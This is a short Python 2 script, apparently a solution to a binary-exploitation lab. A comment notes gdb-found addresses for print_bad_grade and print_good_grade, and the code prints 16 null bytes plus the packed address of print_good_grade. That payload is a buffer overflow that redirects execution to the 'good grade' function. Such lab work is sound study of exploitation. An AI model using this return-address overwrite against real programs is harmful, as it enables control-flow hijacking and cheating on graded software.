'''
By using gdb disas print_bad_grade and disas print_good_grade,
we obtains the address for those two functions.
0x08048ee0 print_bad_grade
0x08048efe print_good_grae
Be aware that x86 is little endian!
'''
from struct import pack
print "\00"*16 +  pack("<I",0x08048efe)
